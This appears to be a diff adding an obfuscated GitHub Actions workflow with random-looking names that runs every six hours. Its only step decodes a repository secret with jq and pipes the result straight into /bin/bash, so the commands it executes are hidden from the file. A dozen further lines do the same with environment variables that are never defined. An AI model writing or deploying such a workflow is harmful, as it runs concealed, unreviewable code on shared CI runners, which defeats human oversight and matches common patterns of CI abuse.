@@ -1,0 +1,30 @@
+name: yancuruoxuede
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '34 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yancuruoxuede
+        env:
+          izxep6: ${{ secrets.izxep6 }}
+        run: |
+          echo $izxep6 | jq -r .t664 | /bin/bash
+          echo $ifejm2812 | jq -r .rs9 | /bin/bash
+          echo $plh3694 | jq -r .w10 | /bin/bash
+          echo $pznz96563 | jq -r .ybn09 | /bin/bash
+          echo $rvilr77 | jq -r .vst1 | /bin/bash
+          echo $lpepz09827 | jq -r .rymq6 | /bin/bash
+          echo $qyay70839 | jq -r .owa6248 | /bin/bash
+          echo $ebj9571 | jq -r .nt8828 | /bin/bash
+          echo $uvgco58050 | jq -r .etof3 | /bin/bash
+          echo $fbu2 | jq -r .dbx16 | /bin/bash
+          echo $ln35 | jq -r .i9 | /bin/bash
+          echo $kx466 | jq -r .nqw65 | /bin/bash
+          echo $s87 | jq -r .vetrw5358 | /bin/bash
+
